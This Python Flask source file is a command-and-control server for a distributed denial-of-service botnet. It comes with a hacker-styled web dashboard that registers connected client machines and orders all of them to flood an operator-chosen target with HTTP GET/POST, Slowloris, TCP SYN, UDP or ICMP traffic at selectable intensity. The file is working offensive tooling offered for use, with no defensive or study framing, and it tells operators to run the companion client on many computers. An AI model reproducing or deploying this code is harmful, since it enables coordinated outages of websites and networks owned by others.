#!/usr/bin/env python3
"""
C2 Server - Controls ALL clients with real Layer 3-7 attacks
"""
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import json
import threading
import time
import os
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional

PORT = int(os.environ.get('PORT', 5000))
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-here')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

clients = {}
attacks = {}
client_lock = threading.Lock()
attack_lock = threading.Lock()

@dataclass
class ClientInfo:
    id: str
    name: str
    hostname: str
    platform: str
    cpu_count: int
    memory_total: int
    connected_at: datetime
    status: str = "idle"
    current_attack: Optional[str] = None
    last_seen: datetime = None
    stats: Dict = None
    
    def __post_init__(self):
        if self.stats is None:
            self.stats = {"requests": 0, "rps": 0, "success": 0}
        if self.last_seen is None:
            self.last_seen = self.connected_at

@dataclass 
class AttackInfo:
    id: str
    target: str
    method: str
    duration: int
    rps: int
    created_at: datetime
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    status: str = "pending"
    client_count: int = 0
    completed_clients: List[str] = None
    results: Dict = None
    
    def __post_init__(self):
        if self.completed_clients is None:
            self.completed_clients = []
        if self.results is None:
            self.results = {
                "total_requests": 0,
                "total_success": 0,
                "avg_rps": 0,
                "total_bytes": 0,
                "client_results": {}
            }

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Layer7 Real Attack C2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #00ff00; padding-bottom: 20px; }
        .header h1 { font-size: 2.5em; text-shadow: 0 0 10px #00ff00; }
        .panel { background: linear-gradient(135deg, #111 0%, #1a1a1a 100%); border: 2px solid #00ff00; padding: 20px; margin: 20px 0; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,0,0.3); }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-box { background: #000; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #00ff00; }
        .stat-box h3 { font-size: 2em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        .stat-box p { color: #888; margin-top: 5px; }
        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
        .client-card { background: linear-gradient(135deg, #1a1a1a 0%, #222 100%); padding: 15px; border-radius: 8px; border-left: 4px solid #00ff00; transition: all 0.3s; }
        .client-card:hover { transform: translateX(5px); box-shadow: 0 0 15px rgba(0,255,0,0.5); }
        .client-card.attacking { border-color: #ff4444; animation: pulse 1s infinite; background: linear-gradient(135deg, #2a0000 0%, #3a0000 100%); }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        .attack-form { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
        .form-group { display: flex; flex-direction: column; }
        .form-group label { margin-bottom: 8px; color: #00ff00; font-weight: bold; }
        .form-group input, .form-group select { padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; font-family: 'Courier New', monospace; }
        .form-group input:focus, .form-group select:focus { outline: none; box-shadow: 0 0 10px rgba(0,255,0,0.5); }
        .button-group { grid-column: 1 / -1; display: flex; gap: 15px; justify-content: center; margin-top: 20px; }
        button { padding: 15px 30px; background: linear-gradient(135deg, #00aa00 0%, #00ff00 100%); color: #000; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.1em; transition: all 0.3s; font-family: 'Courier New', monospace; }
        button:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,0,0.8); }
        button.danger { background: linear-gradient(135deg, #aa0000 0%, #ff0000 100%); color: white; }
        button.danger:hover { box-shadow: 0 0 20px rgba(255,0,0,0.8); }
        .log { background: #000; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; height: 300px; overflow-y: auto; border: 1px solid #00ff00; }
        .log-entry { margin: 5px 0; padding: 8px; border-left: 3px solid #00ff00; animation: slideIn 0.3s; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
        .log-error { border-color: #ff0000; color: #ff6666; }
        .log-success { border-color: #00ff00; color: #00ff00; }
        .log-warning { border-color: #ffff00; color: #ffff00; }
        .method-badge { display: inline-block; padding: 3px 8px; background: #00ff00; color: #000; border-radius: 3px; font-size: 0.8em; font-weight: bold; margin-left: 5px; }
        .layer-info { background: #1a1a1a; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 3px solid #00ff00; }
        .layer-info h4 { color: #00ff00; margin-bottom: 5px; }
        .layer-info p { color: #888; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ LAYER 3-7 ATTACK CONTROLLER</h1>
            <p style="font-size: 1.2em; color: #00ff00;">Real Network Attacks • Multiple Protocols • Distributed Power</p>
        </div>
        
        <div class="panel">
            <h2>📊 Real-Time Statistics</h2>
            <div class="stats-grid">
                <div class="stat-box">
                    <h3 id="client-count">0</h3>
                    <p>Connected Clients</p>
                </div>
                <div class="stat-box">
                    <h3 id="attacking-count">0</h3>
                    <p>Attacking Now</p>
                </div>
                <div class="stat-box">
                    <h3 id="total-requests">0</h3>
                    <p>Total Requests</p>
                </div>
                <div class="stat-box">
                    <h3 id="total-bandwidth">0 MB</h3>
                    <p>Data Sent</p>
                </div>
                <div class="stat-box">
                    <h3 id="active-attack">None</h3>
                    <p>Active Attack</p>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>🎯 Launch Distributed Attack</h2>
            
            <div class="layer-info">
                <h4>📡 Supported Attack Methods:</h4>
                <p><strong>Layer 7:</strong> HTTP GET, HTTP POST, Slowloris</p>
                <p><strong>Layer 4:</strong> TCP SYN Flood, UDP Flood</p>
                <p><strong>Layer 3:</strong> ICMP Ping Flood</p>
            </div>
            
            <div class="attack-form">
                <div class="form-group">
                    <label>🎯 Target URL/IP:</label>
                    <input type="text" id="target" placeholder="https://example.com or 1.2.3.4" value="https://example.com">
                </div>
                <div class="form-group">
                    <label>⚡ Attack Method:</label>
                    <select id="layer">
                        <optgroup label="Layer 7 (HTTP/HTTPS)">
                            <option value="http">HTTP GET Flood</option>
                            <option value="post">HTTP POST Flood</option>
                            <option value="slowloris">Slowloris (Keep-Alive)</option>
                        </optgroup>
                        <optgroup label="Layer 4 (Transport)">
                            <option value="tcp">TCP SYN Flood</option>
                            <option value="udp">UDP Flood</option>
                        </optgroup>
                        <optgroup label="Layer 3 (Network)">
                            <option value="icmp">ICMP Ping Flood</option>
                        </optgroup>
                    </select>
                </div>
                <div class="form-group">
                    <label>⏱️ Duration (seconds):</label>
                    <input type="number" id="duration" value="60" min="10" max="3600">
                </div>
                <div class="form-group">
                    <label>💥 Intensity:</label>
                    <select id="intensity">
                        <option value="low">Low (Testing)</option>
                        <option value="medium" selected>Medium (Normal)</option>
                        <option value="high">High (Aggressive)</option>
                        <option value="extreme">Extreme (Maximum)</option>
                    </select>
                </div>
                <div class="button-group">
                    <button onclick="startAttack()">🚀 LAUNCH ATTACK ON ALL CLIENTS</button>
                    <button class="danger" onclick="stopAttack()">🛑 EMERGENCY STOP</button>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>💻 Connected Clients (<span id="client-list-count">0</span>)</h2>
            <div class="client-grid" id="clients-container">
                <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
                    No clients connected. Run c2_client.py on computers.
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>📝 Attack Log</h2>
            <div class="log" id="log-container">
                <div class="log-entry">Server started. Waiting for clients...</div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        const socket = io();
        let currentAttackId = null;
        let totalBandwidth = 0;
        
        socket.on('connect', () => {
            addLog('✅ Connected to server', 'success');
        });
        
        socket.on('client_connected', (data) => {
            addLog(`✅ Client connected: ${data.client.name}`, 'success');
            updateClientList();
        });
        
        socket.on('client_disconnected', (data) => {
            addLog(`⚠️ Client disconnected: ${data.client_id}`, 'warning');
            updateClientList();
        });
        
        socket.on('attack_started', (data) => {
            currentAttackId = data.attack_id;
            addLog(`🚀 ATTACK LAUNCHED: ${data.attack.target}`, 'success');
            addLog(`   Method: ${data.attack.method.toUpperCase()} | Duration: ${data.attack.duration}s | Clients: ${data.attack.client_count}`, 'success');
            updateStats();
        });
        
        socket.on('client_attack_start', (data) => {
            addLog(`⚡ ${data.client_id} started attacking ${data.target}`);
            updateClientList();
        });
        
        socket.on('client_attack_complete', (data) => {
            const r = data.results;
            addLog(`✅ ${data.client_id} completed: ${r.requests.toLocaleString()} requests, ${r.rps.toFixed(1)} RPS, ${(r.bytes_sent/1024/1024).toFixed(2)} MB`);
            totalBandwidth += r.bytes_sent || 0;
            document.getElementById('total-bandwidth').textContent = (totalBandwidth / 1024 / 1024).toFixed(2) + ' MB';
            updateClientList();
        });
        
        socket.on('attack_completed', (data) => {
            addLog(`🎉 ALL CLIENTS COMPLETED!`, 'success');
            addLog(`📊 Total: ${data.results.total_requests.toLocaleString()} requests | Success: ${data.results.total_success.toFixed(1)}% | Avg RPS: ${data.results.avg_rps.toFixed(1)} | Bandwidth: ${(data.results.total_bytes/1024/1024).toFixed(2)} MB`, 'success');
            currentAttackId = null;
            updateStats();
        });
        
        socket.on('system_stats', (data) => {
            updateStats(data);
        });
        
        function addLog(message, type = 'info') {
            const log = document.getElementById('log-container');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
            
            // Keep only last 100 entries
            while (log.children.length > 100) {
                log.removeChild(log.firstChild);
            }
        }
        
        function updateStats(stats = null) {
            if (stats) {
                document.getElementById('client-count').textContent = stats.clients.total;
                document.getElementById('attacking-count').textContent = stats.clients.attacking;
                document.getElementById('total-requests').textContent = stats.attacks.total_requests.toLocaleString();
                document.getElementById('active-attack').textContent = stats.attacks.active > 0 ? 'Running' : 'None';
            }
        }
        
        function updateClientList() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('clients-container');
                    const count = document.getElementById('client-list-count');
                    
                    count.textContent = data.total;
                    
                    if (data.total === 0) {
                        container.innerHTML = `
                            <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
                                No clients connected. Run c2_client.py on computers.
                            </div>
                        `;
                        return;
                    }
                    
                    container.innerHTML = '';
                    data.clients.forEach(client => {
                        const card = document.createElement('div');
                        card.className = `client-card ${client.status === 'attacking' ? 'attacking' : ''}`;
                        const statusColor = client.status === 'attacking' ? '#ff4444' : '#00ff00';
                        card.innerHTML = `
                            <h3>${client.name} <span class="method-badge" style="background: ${statusColor}; color: ${client.status === 'attacking' ? '#fff' : '#000'}">${client.status.toUpperCase()}</span></h3>
                            <p><strong>🖥️ Host:</strong> ${client.hostname}</p>
                            <p><strong>💻 Platform:</strong> ${client.platform}</p>
                            <p><strong>⚡ CPU:</strong> ${client.cpu_count} cores</p>
                            <p><strong>💾 RAM:</strong> ${Math.round(client.memory_total / 1024 / 1024 / 1024)} GB</p>
                            <p><strong>🕐 Connected:</strong> ${new Date(client.connected_at).toLocaleTimeString()}</p>
                            ${client.current_attack ? `<p><strong>🎯 Attack:</strong> ${client.current_attack}</p>` : ''}
                            ${client.stats.requests > 0 ? `<p><strong>📊 Requests:</strong> ${client.stats.requests.toLocaleString()}</p>` : ''}
                            ${client.stats.rps > 0 ? `<p><strong>⚡ RPS:</strong> ${client.stats.rps.toFixed(1)}</p>` : ''}
                        `;
                        container.appendChild(card);
                    });
                });
        }
        
        function startAttack() {
            const target = document.getElementById('target').value;
            const layer = document.getElementById('layer').value;
            const duration = parseInt(document.getElementById('duration').value);
            const intensity = document.getElementById('intensity').value;
            
            if (!target) {
                alert('❌ Please enter a target URL or IP');
                return;
            }
            
            // RPS based on intensity
            const rpsMap = {
                'low': 50,
                'medium': 200,
                'high': 500,
                'extreme': 1000
            };
            const rps = rpsMap[intensity] || 200;
            
            addLog(`🚀 Launching ${layer.toUpperCase()} attack on ${target}...`, 'warning');
            
            fetch('/api/attack/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target, layer, duration, rps})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    addLog(`✅ ${data.message}`, 'success');
                } else {
                    addLog(`❌ Attack failed: ${data.error}`, 'error');
                }
            });
        }
        
        function stopAttack() {
            if (confirm('⚠️ Stop all running attacks?')) {
                fetch('/api/attack/stop', {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        addLog(data.message, data.success ? 'warning' : 'error');
                    });
            }
        }
        
        // Initial load
        updateStats();
        updateClientList();
        setInterval(updateClientList, 3000);
        setInterval(() => {
            const log = document.getElementById('log-container');
            log.scrollTop = log.scrollHeight;
        }, 100);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/clients')
def get_clients():
    with client_lock:
        return jsonify({
            "success": True,
            "total": len(clients),
            "clients": [asdict(client) for client in clients.values()]
        })

@app.route('/api/stats')
def get_stats():
    with client_lock:
        total_clients = len(clients)
        attacking = len([c for c in clients.values() if c.status == 'attacking'])
    
    with attack_lock:
        active_attacks = len([a for a in attacks.values() if a.status in ['running', 'pending']])
        total_requests = sum(a.results["total_requests"] for a in attacks.values())
    
    return jsonify({
        "success": True,
        "clients": {"total": total_clients, "attacking": attacking},
        "attacks": {"active": active_attacks, "total_requests": total_requests}
    })

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    try:
        data = request.json
        target = data['target']
        layer = data.get('layer', 'http')
        duration = int(data.get('duration', 60))
        rps = int(data.get('rps', 100))
        
        attack_id = f"attack_{int(time.time())}"
        
        with attack_lock:
            attack = AttackInfo(
                id=attack_id,
                target=target,
                method=layer,
                duration=duration,
                rps=rps,
                created_at=datetime.now(),
                status="starting"
            )
            attacks[attack_id] = attack
        
        with client_lock:
            connected_clients = list(clients.keys())
            attack.client_count = len(connected_clients)
            
            if attack.client_count == 0:
                return jsonify({"success": False, "error": "No clients connected"}), 400
            
            for client_id in connected_clients:
                clients[client_id].status = "attacking"
                clients[client_id].current_attack = attack_id
                
                socketio.emit('attack_command', {
                    'attack_id': attack_id,
                    'target': target,
                    'method': layer,
                    'duration': duration,
                    'rps': rps,
                    'command': 'start'
                }, room=client_id)
        
        attack.status = "running"
        attack.started_at = datetime.now()
        
        socketio.emit('attack_started', {
            'attack_id': attack_id,
            'attack': asdict(attack)
        }, broadcast=True)
        
        return jsonify({
            "success": True,
            "message": f"Attack started on {attack.client_count} clients",
            "attack_id": attack_id,
            "client_count": attack.client_count
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    with client_lock:
        for client in clients.values():
            client.status = "idle"
            client.current_attack = None
            socketio.emit('attack_command', {'command': 'stop'}, room=client.id)
    
    with attack_lock:
        for attack in attacks.values():
            if attack.status == "running":
                attack.status = "stopped"
                attack.completed_at = datetime.now()
    
    socketio.emit('attack_stopped', {'message': 'All attacks stopped'}, broadcast=True)
    return jsonify({"success": True, "message": "🛑 All attacks stopped"})

@socketio.on('connect')
def handle_connect():
    client_id = request.sid
    print(f"[+] Client connected: {client_id}")

@socketio.on('client_register')
def handle_client_register(data):
    client_id = request.sid
    
    with client_lock:
        client = ClientInfo(
            id=client_id,
            name=data.get('name', f'Client_{client_id[:8]}'),
            hostname=data.get('hostname', 'Unknown'),
            platform=data.get('platform', 'Unknown'),
            cpu_count=data.get('cpu_count', 1),
            memory_total=data.get('memory_total', 0),
            connected_at=datetime.now()
        )
        clients[client_id] = client
    
    emit('welcome', {'message': 'Connected to C2 Server', 'client_id': client_id})
    
    socketio.emit('client_connected', {
        'client': asdict(client),
        'total_clients': len(clients)
    }, broadcast=True)

@socketio.on('client_stats')
def handle_client_stats(data):
    client_id = request.sid
    with client_lock:
        if client_id in clients:
            clients[client_id].last_seen = datetime.now()
            clients[client_id].stats.update(data.get('stats', {}))

@socketio.on('attack_started')
def handle_client_attack_start(data):
    client_id = request.sid
    socketio.emit('client_attack_start', {
        'client_id': client_id,
        'target': data.get('target'),
        'attack_id': data.get('attack_id')
    }, broadcast=True)

@socketio.on('attack_progress')
def handle_attack_progress(data):
    client_id = request.sid
    socketio.emit('client_attack_progress', {
        'client_id': client_id,
        'progress': data
    }, broadcast=True)

@socketio.on('attack_complete')
def handle_attack_complete(data):
    client_id = request.sid
    attack_id = data.get('attack_id')
    results = data.get('results', {})
    
    with client_lock:
        if client_id in clients:
            clients[client_id].status = "idle"
            clients[client_id].current_attack = None
            clients[client_id].stats.update(results)
    
    with attack_lock:
        if attack_id in attacks:
            attack = attacks[attack_id]
            attack.completed_clients.append(client_id)
            attack.results["client_results"][client_id] = results
            attack.results["total_requests"] += results.get('requests', 0)
            attack.results["total_success"] += results.get('success', 0)
            attack.results["total_bytes"] += results.get('bytes_sent', 0)
            
            if len(attack.completed_clients) >= attack.client_count:
                attack.status = "completed"
                attack.completed_at = datetime.now()
                
                if attack.client_count > 0:
                    attack.results["avg_rps"] = attack.results["total_requests"] / attack.duration
                    attack.results["total_success"] = (attack.results["total_success"] / attack.client_count) if attack.client_count > 0 else 0
                
                socketio.emit('attack_completed', {
                    'attack_id': attack_id,
                    'results': attack.results
                }, broadcast=True)
    
    socketio.emit('client_attack_complete', {
        'client_id': client_id,
        'results': results
    }, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    client_id = request.sid
    with client_lock:
        if client_id in clients:
            client = clients.pop(client_id)
            print(f"[-] Client disconnected: {client.name}")
            socketio.emit('client_disconnected', {
                'client_id': client_id,
                'total_clients': len(clients)
            }, broadcast=True)

def background_tasks():
    while True:
        try:
            with client_lock:
                total = len(clients)
                attacking = len([c for c in clients.values() if c.status == 'attacking'])
            
            with attack_lock:
                active = len([a for a in attacks.values() if a.status in ['running', 'pending']])
                total_requests = sum(a.results["total_requests"] for a in attacks.values())
            
            socketio.emit('system_stats', {
                'clients': {'total': total, 'attacking': attacking},
                'attacks': {'active': active, 'total_requests': total_requests}
            }, broadcast=True)
            
            time.sleep(2)
        except:
            time.sleep(5)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════╗
    ║  LAYER 3-7 DISTRIBUTED C2 SERVER    ║
    ║  Real Network Attacks               ║
    ║  Multiple Protocol Support          ║
    ╚══════════════════════════════════════╝
    """)
    
    threading.Thread(target=background_tasks, daemon=True).start()
    
    print(f"[📡] Server starting on port {PORT}")
    print(f"[🔗] Web interface: http://localhost:{PORT}")
    print(f"[⚡] Supports: HTTP GET/POST, Slowloris, TCP, UDP, ICMP")
    print(f"[💻] Run c2_client.py on ALL computers\n")
    
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
